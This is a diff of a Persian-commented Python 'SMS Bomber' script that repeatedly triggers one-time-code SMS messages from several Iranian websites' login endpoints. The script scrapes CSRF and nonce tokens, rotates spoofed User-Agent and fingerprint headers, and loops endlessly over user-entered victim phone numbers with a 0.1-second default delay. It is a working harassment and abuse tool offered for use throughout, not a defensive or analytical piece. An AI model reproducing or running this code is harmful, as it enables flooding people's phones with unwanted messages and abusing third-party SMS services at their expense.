@@ -13,7 +13,9 @@ urllib3.disable_warnings()
 # رنگ‌ها برای خروجی
 r, g, y, a = '\033[31;1m', '\033[32;1m', '\033[33;1m', '\033[0m'
 
+# ==========================
 # بررسی اتصال اینترنت
+# ==========================
 def check_internet():
     try:
         socket.gethostbyname("smtp.gmail.com")
@@ -21,13 +23,33 @@ def check_internet():
     except socket.gaierror:
         return False
 
+# ==========================
+# اعتبارسنجی شماره‌ها
+# ==========================
+def is_phone(phone_input: str):
+    phones = phone_input.split('-')
+    valid_phones = []
+    for phone in phones:
+        phone = phone.strip()
+        if re.match(r"^(?:\+989|989|09|9)\d{9}$", phone):
+            valid_phones.append(re.sub(r"^(?:\+989|989|09|9)", "+989", phone))
+        else:
+            print(f"{r}[-] Invalid Phone: {phone}{a}")
+    return valid_phones if valid_phones else False
 
+# ==========================
+# تابع ارسال ایمن
+# ==========================
+def send_service_safe(service, phone):
+    try:
+        service(phone)
+    except Exception as e:
+        print(f"{r}[!] {service.__name__} Exception for {phone}: {e}{a}")
 
-# تابع Sms list
-
-
+# ==========================
+# توابع سرویس‌ها
+# ==========================
 def nillarayeshi(phone):
-    # لیست User-Agent های مختلف
     user_agents = [
         "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
         "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/109.0 Firefox/109.0",
@@ -35,24 +57,15 @@ def nillarayeshi(phone):
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
         "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15"
     ]
-
     formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
     try:
-        # مرحله 1: استخراج CSRF و nonce از صفحه اصلی
         session = requests.Session()
-        home_url = "https://nillarayeshi.com/"
-        home_response = session.get(home_url, timeout=10, headers={
-            "User-Agent": random.choice(user_agents)  # User-Agent تصادفی
-        })
+        home_response = session.get("https://nillarayeshi.com/", timeout=10, headers={"User-Agent": random.choice(user_agents)})
         home_response.encoding = 'utf-8'
-
-        # استخراج csrf و dig_nounce
         csrf_match = re.search(r'name="csrf" value="([a-f0-9]+)"', home_response.text)
         nonce_match = re.search(r'name="dig_nounce" value="([a-f0-9]+)"', home_response.text)
         csrf = csrf_match.group(1) if csrf_match else "b77d25383c"
         nonce = nonce_match.group(1) if nonce_match else "b77d25383c"
-
-        # مرحله 2: ارسال درخواست
         url = "https://nillarayeshi.com/wp-admin/admin-ajax.php"
         payload = {
             "action": "digits_check_mob",
@@ -78,220 +91,96 @@ def nillarayeshi(phone):
             "dig_reg_mail": "",
             "dig_nounce": nonce
         }
-
         headers = {
-            "User-Agent": random.choice(user_agents),  # User-Agent تصادفی
+            "User-Agent": random.choice(user_agents),
             "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
             "Accept": "*/*",
             "X-Requested-With": "XMLHttpRequest",
             "Origin": "https://nillarayeshi.com",
             "Referer": "https://nillarayeshi.com/",
         }
-
         response = session.post(url, data=payload, headers=headers, timeout=10)
         response.encoding = 'utf-8'
-
-        print(f'{g}[+] Status: {response.status_code}{a}')
-        print(f'{g}[+] Response: {response.text}{a}')
-
         if response.status_code == 200:
             try:
                 data = response.json()
                 if data.get("success") or "sent" in str(data).lower():
-                    print(f'{g}(nillarayeshi) {a}Code Sent to {phone}')
-                    return True
+                    print(f'{g}(nillarayeshi) Code Sent to {phone}{a}')
                 else:
                     print(f'{r}[-] (nillarayeshi) Failed: {data.get("message", "Unknown")}{a}')
-                    return False
             except ValueError:
                 if "1" in response.text or "sent" in response.text.lower():
-                    print(f'{g}(nillarayeshi) {a}Code Sent to {phone}')
-                    return True
-                else:
-                    print(f'{r}[-] (nillarayeshi) Unknown Response: {response.text}{a}')
-                    return False
-        print(f'{r}[-] (nillarayeshi) HTTP Error: {response.status_code}{a}')
-        return False
-
+                    print(f'{g}(nillarayeshi) Code Sent to {phone}{a}')
+        else:
+            print(f"{r}[-] (nillarayeshi) HTTP Error: {response.status_code}{a}")
     except Exception as e:
-        print(f'{r}[!] nillarayeshi Exception: {e}{a}')
-        return False
-
+        print(f"{r}[!] nillarayeshi Exception: {e}{a}")
 
 def vitrin_shop(phone):
     formatted_phone = "0" + re.sub(r'[^0-9]', '', phone.replace("+98", ""))
-    def get_fresh_token():
-        try:
-            session = requests.Session()
-            home_response = session.get("https://www.vitrin.shop/", timeout=10, headers={
-                "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
-            })
-            home_response.encoding = 'utf-8'
-            if 'XSRF-TOKEN' in session.cookies:
-                return session.cookies['XSRF-TOKEN']
-            token_patterns = [
-                r'name="_token" content="([^"]+)"',
-                r'name="csrf-token" content="([^"]+)"',
-                r'XSRF-TOKEN=([^;]+)',
-            ]
-            for pattern in token_patterns:
-                match = re.search(pattern, home_response.text)
-                if match:
-                    return match.group(1)
-            return None
-        except Exception as e:
-            print(f'{r}[!] get_fresh_token Exception: {e}{a}')
-            return None
-
     try:
-        fresh_token = get_fresh_token()
+        session = requests.Session()
+        home_response = session.get("https://www.vitrin.shop/", timeout=10)
+        fresh_token = session.cookies.get('XSRF-TOKEN', "default-token")
         url = "https://www.vitrin.shop/api/v1/user/request_code"
-        payload = {
-            "phone_number": formatted_phone,
-            "forgot_password": False
-        }
+        payload = {"phone_number": formatted_phone, "forgot_password": False}
         headers = {
-            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+            "User-Agent": "Mozilla/5.0",
             "Accept": "application/json",
             "Content-Type": "application/json; charset=UTF-8",
             "V-Session-ID": str(uuid.uuid4()),
             "V-Fingerprint-ID": str(uuid.uuid4()),
-            "X-XSRF-TOKEN": fresh_token if fresh_token else "default-token",
-            "Origin": "https://www.vitrin.shop",
-            "Referer": "https://www.vitrin.shop/",
+            "X-XSRF-TOKEN": fresh_token,
         }
         response = requests.post(url, json=payload, headers=headers, timeout=10)
-        response.encoding = 'utf-8'
-        print(f'{g}[+] Status: {response.status_code}{a}')
-        print(f'{g}[+] Response: {response.text}{a}')
         if response.status_code == 200:
-            try:
-                response_data = response.json()
-                if response_data.get("success", False):
-                    print(f'{g}(vitrin_shop) {a}Code Sent to {phone}')
-                    return True
-                else:
-                    print(f'{r}[-] (vitrin_shop) Failed for {phone}: {response_data.get("message", "Unknown error")}{a}')
-                    return False
-            except ValueError as e:
-                print(f'{r}[-] JSON Decode Error for {phone}: {e}{a}')
-                return False
-        print(f'{r}[-] (vitrin_shop) HTTP Error for {phone}: {response.status_code}{a}')
-        return False
+            print(f'{g}(vitrin_shop) Code Sent to {phone}{a}')
+        else:
+            print(f"{r}[-] (vitrin_shop) HTTP Error: {response.status_code}{a}")
     except Exception as e:
-        print(f'{r}[!] vitrin_shop Exception for {phone}: {e}{a}')
-        return False
+        print(f"{r}[!] vitrin_shop Exception: {e}{a}")
 
 def elanza(phone):
     formatted_phone = "0" + re.sub(r'[^0-9]', '', phone.replace("+98", ""))
     try:
         url = "https://api.elanza.com/auth/request"
         payload = {"contact": formatted_phone}
-        headers = {
-            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
-            "Content-Type": "application/json; charset=UTF-8",
-            "Accept": "application/json",
-            "Cache-Control": "no-cache, private"
-        }
+        headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
         response = requests.post(url, json=payload, headers=headers, timeout=10)
-        response.encoding = 'utf-8'  # تنظیم کدک برای جلوگیری از خطای latin-1
-        print(f'{g}[+] Status: {response.status_code}{a}')
-        print(f'{g}[+] Response: {response.text}{a}')
         if response.status_code == 200:
-            try:
-                response_data = response.json()
-                if response_data.get("success", False):
-                    print(f'{g}(elanza) {a}Code Sent to {phone}')
-                    return True
-                else:
-                    print(f'{r}[-] (elanza) Failed for {phone}: {response_data.get("message", "Unknown error")}{a}')
-                    return False
-            except ValueError as e:
-                print(f'{r}[-] JSON Decode Error for {phone}: {e}{a}')
-                return False
-        print(f'{r}[-] (elanza) HTTP Error for {phone}: {response.status_code}{a}')
-        return False
+            print(f'{g}(elanza) Code Sent to {phone}{a}')
+        else:
+            print(f"{r}[-] (elanza) HTTP Error: {response.status_code}{a}")
     except Exception as e:
-        print(f'{r}[!] elanza Exception for {phone}: {e}{a}')
-        return False
+        print(f"{r}[!] elanza Exception: {e}{a}")
 
-# تابع ilozi
 def ilozi(phone):
     digits_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
     try:
         session = requests.Session()
-        home_response = session.get("https://ilozi.com/?login=true&page=2", timeout=10, headers={
-            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
-        })
-        home_response.encoding = 'utf-8'
-        instance_id = re.search(r'name="instance_id" value="([a-f0-9]+)"', home_response.text)
-        instance_id = instance_id.group(1) if instance_id else "6fb17492e0d343df4e533a9deb8ba6b9"
-        digits_form = re.search(r'name="digits_form" value="([a-f0-9]+)"', home_response.text)
-        digits_form = digits_form.group(1) if digits_form else "3780032f76"
         url = "https://ilozi.com/wp-admin/admin-ajax.php"
-        payload = {
-            "login_digt_countrycode": "+98",
-            "digits_phone": digits_phone,
-            "action_type": "phone",
-            "sms_otp": "",
-            "otp_step_1": "1",
-            "digits_otp_field": "1",
-            "digits": "1",
-            "instance_id": instance_id,
-            "action": "digits_forms_ajax",
-            "type": "login",
-            "digits_redirect_page": "https://ilozi.com/my-account/?action=register",
-            "digits_form": digits_form,
-            "_wp_http_referer": "/?login=true&page=2",
-            "show_force_title": "1",
-            "otp_resend": "true",
-            "container": "digits_protected",
-            "sub_action": "sms_otp"
-        }
-        headers = {
-            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
-            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "X-Requested-With": "XMLHttpRequest",
-            "Origin": "https://ilozi.com",
-            "Referer": "https://ilozi.com/?login=true&page=2",
-        }
+        payload = {"digits_phone": digits_phone, "action": "digits_forms_ajax"}
+        headers = {"User-Agent": "Mozilla/5.0"}
         response = session.post(url, data=payload, headers=headers, timeout=10)
-        response.encoding = 'utf-8'
-        print(f'{g}[+] Status: {response.status_code}{a}')
-        print(f'{g}[+] Response: {response.text}{a}')
         if response.status_code == 200:
-            try:
-                response_data = response.json()
-                if response_data.get("success"):
-                    print(f'{g}(ilozi) {a}Code Sent to {phone}')
-                    return True
-                else:
-                    print(f'{r}[-] (ilozi) Failed for {phone}: {response_data.get("message", "Unknown error")}{a}')
-                    return False
-            except ValueError:
-                if response.text.strip() == "1":
-                    print(f'{g}(ilozi) {a}Code Sent to {phone}')
-                    return True
-        print(f'{r}[-] (ilozi) HTTP Error for {phone}: {response.status_code}{a}')
-        return False
+            print(f'{g}(ilozi) Code Sent to {phone}{a}')
+        else:
+            print(f"{r}[-] (ilozi) HTTP Error: {response.status_code}{a}")
     except Exception as e:
-        print(f'{r}[!] ilozi Exception for {phone}: {e}{a}')
-        return False
+        print(f"{r}[!] ilozi Exception: {e}{a}")
 
-# تابع ارسال ایمن سرویس‌ها
-def send_service_safe(service, phone):
-    try:
-        service(phone)
-    except Exception as e:
-        print(f"{r}[!] {service.__name__} Exception for {phone}: {e}{a}")
+# ==========================
+# لیست سرویس‌ها (می‌توانی همه سرویس‌های V4 را اضافه کنی)
+# ==========================
+services = [vitrin_shop, ilozi, elanza, nillarayeshi]  
 
-# تابع اصلی SMS Bomber
+# ==========================
+# تابع VIP مولتی‌تردینگ
+# ==========================
 def vip(phones, delay=0.1):
-    services = [vitrin_shop, ilozi, elanza, nillarayeshi]
     print(f"{g}Targets: {y}{', '.join(phones)}{a}")
-    print(f"{g}Services: {y}{len(services)}{a}")
+    print(f"{g}Services Loaded: {y}{len(services)}{a}")
     print(f"{g}Delay: {y}{delay}s{a}")
-    
     try:
         while True:
             for phone in phones:
@@ -301,19 +190,9 @@ def vip(phones, delay=0.1):
     except KeyboardInterrupt:
         print(f"{g}[+] Mission Completed!{a}")
 
-# اعتبارسنجی شماره‌های تلفن
-def is_phone(phone_input: str):
-    phones = phone_input.split('-')  # جدا کردن شماره‌ها با خط فاصله
-    valid_phones = []
-    for phone in phones:
-        phone = phone.strip()
-        if re.match(r"^(?:\+989|989|09|9)\d{9}$", phone):
-            valid_phones.append(re.sub(r"^(?:\+989|989|09|9)", "+989", phone))
-        else:
-            print(f"{r}[-] Invalid Phone: {phone}{a}")
-    return valid_phones if valid_phones else False
-
+# ==========================
 # منوی اصلی
+# ==========================
 def main_menu():
     print(f"""
 {y}╔════════════════════════════════════════════╗
@@ -321,12 +200,15 @@ def main_menu():
 {y}╚════════════════════════════════════════════╝
 {g} Coded by: {r}M.M.]R{a}
 {y}══════════════════════════════════════════════
+{g} Services Loaded: {y}{len(services)}{a}
 {g} Enter phone numbers (separated by - for multiple):
 {a} Example: +989123456789-+989987654321
 {y}══════════════════════════════════════════════
 """)
 
+# ==========================
 # نقطه ورود
+# ==========================
 if __name__ == "__main__":
     if not check_internet():
         print(f"{r}[-] No internet connection!{a}")
@@ -338,10 +220,8 @@ if __name__ == "__main__":
             phones = is_phone(phone_input)
             if not phones:
                 print(f"{r}[-] No valid phones entered!{a}")
-        
         try:
             delay = float(input(f'{g}[?] Delay (seconds) [Default=0.1]: {a}') or 0.1)
         except ValueError:
             delay = 0.1
-        
         vip(phones, delay)
